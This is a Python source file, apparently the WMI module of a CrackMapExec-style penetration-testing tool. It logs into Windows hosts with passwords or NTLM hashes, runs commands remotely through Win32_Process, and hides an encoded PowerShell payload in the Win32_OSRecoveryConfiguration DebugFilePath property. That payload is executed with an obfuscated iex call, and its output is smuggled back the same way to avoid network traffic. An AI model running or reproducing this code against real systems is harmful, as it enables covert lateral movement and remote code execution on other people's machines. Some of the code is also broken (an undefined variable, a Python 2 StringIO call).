########################################################################################
# Inspired and code partially stolen from : https://github.com/Orange-Cyberdefense/cme-wmi
#    WMI Shell: https://github.com/Orange-Cyberdefense/wmi-shell 
#    WMImplant: https://github.com/FortyNorthSecurity/WMImplant
#
#   Modified,Updated, and Xferred to Python3 by @awsmhacks
########################################################################################


import sys
import os
import ntpath
import argparse
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login
from impacket.dcerpc.v5.dcom.wmi import IID_IWbemLevel1Login
from impacket.dcerpc.v5.dcom.wmi import WBEM_FLAG_FORWARD_ONLY
from impacket.dcerpc.v5.dcom.wmi import IWbemLevel1Login

from cmx.connection import *
from cmx.logger import CMXLogAdapter
from cmx.helpers.logger import highlight
from cmx.helpers.misc import *
from cmx.helpers.powershell import create_ps_command
from cmx.helpers.wmirpc import RPCRequester
from cmx import config as cfg

import pprint
import cchardet
import re
import time
from termcolor import colored
from io import StringIO


class wmi(connection):

    def __init__(self, args, db, host):
    #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '       Method: ' + sys._getframe(0).f_code.co_name
        self.domain = ''
        self.hash = None
        self.lmhash = ''
        self.nthash = ''
        self.namespace = args.namespace
        self.backup_value = ''

        if args.domain:
            self.domain = args.domain

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        def get_arg_index(parser, arg_string):
            for obj in parser._actions:
                if arg_string in obj.option_strings: 
                    return parser._actions.index(obj)
        def set_arg(parser, arg_string, index):
            parser._actions[index].option_strings.append(arg_string)



        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '       Method: ' + sys._getframe(0).f_code.co_name
        wmi_parser = parser.add_parser('wmi', help="own stuff using WMI", parents=[std_parser, module_parser], conflict_handler='resolve')
        wmi_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')

        ##### changing inherited module options (like server-port) provokes errors for other protocols, a bug in python's argparse : https://bugs.python.org/issue22401 
        ##### so we fix it: 
        #pprint.pprint(vars(module_parser), indent=1)   
        i = get_arg_index(module_parser, "--server")
        j = get_arg_index(module_parser, "--server-host")
        k = get_arg_index(module_parser, "--server-port")
        wmi_parser.add_argument("--server", choices={'http', 'https'}, default='https', help=argparse.SUPPRESS)
        wmi_parser.add_argument("--server-host", type=str, default='127.0.0.1', metavar='HOST', help=argparse.SUPPRESS)
        wmi_parser.add_argument("--server-port", metavar='PORT', type=int, default=65516, help=argparse.SUPPRESS)
        set_arg(module_parser, "--server", i)
        set_arg(module_parser, "--server-host", j)
        set_arg(module_parser, "--server-port", k)
        #####
        dgroup = wmi_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, help="domain to authenticate to")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')
        wmi_parser.add_argument("--port", type=int, default=135, help="WMI port (default: 135)")
        wmi_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
        
        egroup = wmi_parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
        egroup.add_argument("--query", metavar='QUERY', type=str, help='issues the specified WMI query')
        egroup.add_argument("--execute", metavar='EXECUTE', type=str, help='creates a new cmd.exe /c process and executes the specified command with output')
        egroup.add_argument("--namespace", metavar='NAMESPACE', type=str, default='root\\cimv2', help='WMI Namespace (default: root\\cimv2)')
        
        return parser

    def proto_flow(self):
        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '       Method: ' + sys._getframe(0).f_code.co_name
        self.proto_logger()

        if self.login():
                if hasattr(self.args, 'module') and self.args.module:
                    self.call_modules()
                else:
                    self.call_cmd_args()

    def proto_logger(self):
        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '       Method: ' + sys._getframe(0).f_code.co_name
        self.logger = CMXLogAdapter(extra={
                                        'protocol': 'WMI',
                                        'host': self.host,
                                        'port': self.args.port,
                                        'hostname': self.hostname
                                        })

    def module_logger(self, module):
    # recreating the context necessary for send_fake_response()
        module_log = CMXLogAdapter(extra={
                                          'module': module.name.upper(),
                                          'host': self.host,
                                          'port': self.args.port,
                                          'hostname': self.hostname
                                         })

        self.db.add_computer(self.host, self.hostname, 'XXX', 'Vindovs')
        context = Context(self.db, module_log, self.args)
        return context


    def plaintext_login(self, domain, username, password):
    #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '       Method: ' + sys._getframe(0).f_code.co_name
        try:
            self.password = password
    
            self.init_self_args(domain, username, password)
            out = '{}\\{}:{} {}'.format(domain,
                                        username,
                                        password,
                                        highlight('({})'.format(cfg.pwn3d_label) if self.admin_privs else ''))
            self.logger.success(out)
            if not self.args.continue_on_success:
                return True

    
        except Exception as e:
            self.logger.error(u'{}\\{}:{} "{}"'.format(self.domain,
                                                           username,
                                                           password,
                                                           e))
            return False
    
    def hash_login(self, domain, username, ntlm_hash):
        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '       Method: ' + sys._getframe(0).f_code.co_name
        lmhash = ''
        nthash = ''

        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash
       
        try:
            self.hash = ntlm_hash
            if lmhash: self.lmhash = lmhash
            if nthash: self.nthash = nthash

            self.init_self_args(domain, username, str())
            out = '{}\\{}:{} {}'.format(domain,
                                        username,
                                        password,
                                        highlight('({})'.format(cfg.pwn3d_label) if self.admin_privs else ''))
            self.logger.success(out)

            if not self.args.continue_on_success:
                return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{} {} {} {}'.format(domain.decode('utf-8'),
                                                        username.decode('utf-8'),
                                                        ntlm_hash,
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))

            if error == 'STATUS_LOGON_FAILURE': self.inc_failed_login(username)

            return False

    def init_self_args(self, domain, username, password):
        self.username = username
        self.domain = domain
        self.RPCRequest = RPCRequester(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
     
        self.hostname = self.get_values(self.query('Select Name From Win32_ComputerSystem', self.namespace, printable=False))['Name'] 

        if self.args.local_auth:
            self.domain = self.hostname

        self.logger.hostname = self.hostname
        self.admin_privs = True


    def query(self, wmi_query=None, namespace=None, printable=True):
        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '       Method: ' + sys._getframe(0).f_code.co_name
        records = []
        returnedIndex = []
        if not namespace:
            namespace = self.namespace
        try:
            self.RPCRequest._create_wmi_connection(namespace=namespace)
            if wmi_query:
                output = self.RPCRequest._wmi_connection.ExecQuery(wmi_query, lFlags=WBEM_FLAG_FORWARD_ONLY)
            else:
                output = self.RPCRequest._wmi_connection.ExecQuery(self.args.query, lFlags=WBEM_FLAG_FORWARD_ONLY)
        except Exception as e:
            self.logger.error('Error creating WMI connection: {}'.format(e))
            return records

        while True:
            try:
                wmi_results = output.Next(0xffffffff, 1)[0]
                record = wmi_results.getProperties()
                records.append(record)

                for k, v in record.items():
                    returnedIndex.append(v['value'])

            except Exception as e:
                if str(e).find('S_FALSE') < 0:
                    raise e
                else:
                    break

        return records

    def get_values(self, records=None, rowlimit=None): 
        values = {}
        if not rowlimit:
            rowlimit = len(records)
        limit = 1
        try: 
            for i in range(limit):
                record = records[i]
                for k,v in record.items():
                    values[k] = v['value']
        except Exception as e:
            self.logger.error('Error getting WMI query results: {}'.format(e))
    
        return values

    def update(self, wmi_object_name='Win32_OSRecoveryConfiguration', wmi_property='DebugFilePath', namespace=None, update_value=None):
    #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '       Method: ' + sys._getframe(0).f_code.co_name

        def check_error(banner, resp):
            if resp.GetCallStatus(0) != 0:
                print ('%s - marshall ERROR (0x%x)' % (banner, resp.GetCallStatus(0)))
            else:
                #print '%s - marshall OK' % banner
                pass

        if not namespace:
            namespace = self.namespace
        if not update_value:
            print ('Set an update_value !')
            exit(0)
        try:
            dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=False)
            
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
            iWbemLevel1Login = IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()
            
            wmiClass, callResult = iWbemServices.GetObject(wmi_object_name)
            wmiClass = wmiClass.SpawnInstance()

        ########### setting the exact same values from the current instance to the new instance 
            values = self.get_values(self.query('Select Caption, Description, SettingID, AutoReboot, DebugFilePath,  DebugInfoType, ExpandedDebugFilePath, ExpandedMiniDumpDirectory, KernelDumpOnly, MiniDumpDirectory, Name, OverwriteExistingDebugFile, SendAdminAlert, WriteDebugInfo, WriteToSystemLog From Win32_OSRecoveryConfiguration', namespace, printable=False))
            
            for k in values:
                setattr(wmiClass, k, values[k])

            ########### Seems like type differences for int and boolean values are not correctly handled in impacket.dcerpc.v5.dcom.wmi, so we have to do them manually
            # Here are Win32_OSRecoveryConfiguration attribute CIM types:
            #string:
            #   Caption
            #   Name
            #   DebugFilePath
            #   Description
            #   ExpandedDebugFilePath
            #   ExpandedMiniDumpDirectory
            #   MiniDumpDirectory
            #   SettingID
            #
            #boolean:
            #   AutoReboot
            #   KernelDumpOnly
            #   OverwriteExistingDebugFile
            #   SendAdminAlert
            #   WriteDebugInfo
            #   WriteToSystemLog
            #
            #uint32:
            #   DebugInfoType

            wmiClass.SettingID = str(wmiClass.SettingID)
            wmiClass.Caption = str(wmiClass.Caption)
            wmiClass.Description = str(wmiClass.Description)
            wmiClass.AutoReboot = int(wmiClass.AutoReboot == 'True')
            wmiClass.OverwriteExistingDebugFile = int(wmiClass.OverwriteExistingDebugFile == 'True')
            wmiClass.WriteDebugInfo = int(wmiClass.WriteDebugInfo == 'True')
            wmiClass.WriteToSystemLog = int(wmiClass.WriteToSystemLog == 'True')

        ############ updating the target property value
            wmiClass.DebugFilePath = update_value
        ############ IMPORTANT : after update, ExpandedDebugFilePath has garbage byte values, so we reset it (will be replaced by Windows later, so no pb)
            wmiClass.ExpandedDebugFilePath = "" 

            check_error('Writing to DebugFilePath', iWbemServices.PutInstance(wmiClass.marshalMe()))
            dcom.disconnect()
    
        except Exception as e:
            self.logger.error('Error creating WMI connection: {}'.format(e))


    def execute(self, command=None):
        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '       Method: ' + sys._getframe(0).f_code.co_name
        if not command:
            self.logger.error("Missing command in wmi exec() !")
            return
        shell_cmd = 'cmd.exe /Q /c ' + command

        dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True)
        iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login,IID_IWbemLevel1Login)
        iWbemLevel1Login = IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        iWbemLevel1Login.RemRelease()

        win32Process, callResult = iWbemServices.GetObject('Win32_Process')
        win32Process.Create(shell_cmd, 'C:\\', None)
        dcom.disconnect()

        return


    def degen_ps_iex_cradle(self, payload=None):
        results = []
        if not payload:
            self.logger.error("ERROR degen_ps_iex_cradle : no payload !")
        m = re.search('DownloadString\(\'.+?://.+?/.+?\'\)\n\$cmd = (.+)?\n', payload)
        ####### ^ remember to grab all names and commands - see cme.helpers.powershell -> gen_ps_iex_cradle

        if m: 
            return m.group(1)
        return results  


    def ps_execute(self, payload=None, get_output=False, methods=None, force_ps32=False, dont_obfs=False):
        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '       Method: ' + sys._getframe(0).f_code.co_name
    
        script_command = self.degen_ps_iex_cradle(payload)
        encoded_script = ','.join(map(str,map(ord,self.module.ps_script)))
        len_enc_script = len(encoded_script)
        ####### ^ remember to make it for all ps_scripts{1,2,...}. Some modules have more than one PS script.
    
        self.backup_value = self.get_values(self.query('Select DebugFilePath From Win32_OSRecoveryConfiguration', self.namespace, printable=False))['DebugFilePath']
        self.update(update_value=encoded_script)
    
        decode_script_command = '''
                        $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a = [char[]][int[]]$a.DebugFilePath.Split(',') -Join ''; $a | .(-Join[char[]]@(105,101,120));$output = ({script_command} | Out-String).Trim(); $EncodedText = [Int[]][Char[]]$output -Join ','; $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()
                        '''.format(script_command=script_command)
    
        #print 'Decode script command is : ' + decode_script_command
        ps_comm = create_ps_command(decode_script_command, force_ps32=False, dont_obfs=False)
    
        #print 'Executing : ' + ps_comm
        self.execute(ps_comm)
        
        #sys.stdout.write('Waiting a few seconds for output to be inserted in DebugFilePath ..')
        while True:
            exec_result = self.get_values(self.query('Select DebugFilePath From Win32_OSRecoveryConfiguration', self.namespace, printable=False))['DebugFilePath']
            len_exec_result = len(exec_result) 
            time.sleep(1)   
            #sys.stdout.write('.')
            if not len_exec_result == len_enc_script:
                break
    
        #print 
        #print 'Detected encoding : ' + cchardet.detect(exec_result)['encoding']

        output = ''.join(map(chr,map(int,exec_result.strip().split(',')))) 

        #print colored(output, 'yellow', attrs=['bold'])
        #print 'Detected encoding2: ' + cchardet.detect(self.backup_value)['encoding']
        #print 'Restoring initial value : ' + self.backup_value
    
        self.update(update_value=self.backup_value)
        context = self.module_logger(self.module)
        self.send_fake_response(output, self.module, self.host, context)
    
    def send_fake_response(self, data, module, host, context):
        # Two options here: 
        #     - send a real HTTP response with the output to CME's HTTP Server ; but the module send back a HTTP Status 200 Reply and we don't want any HTTP network traffic
        #     - just give a fake object to the module's on_response() method, and all is well!  
        len_data = len(data)
        fake_file_obj = StringIO.StringIO(data)
        fake_headers = type('', (object,), {'getheader': lambda self,x: len_data})()
        fake_response = type('', (object,), {'client_address':[host], 'rfile': fake_file_obj, 'headers': fake_headers, 'end_headers': lambda self:None, 'stop_tracking_host': lambda self:None, 'send_response': lambda self,x: None})()
        module.on_response(context, fake_response)
        
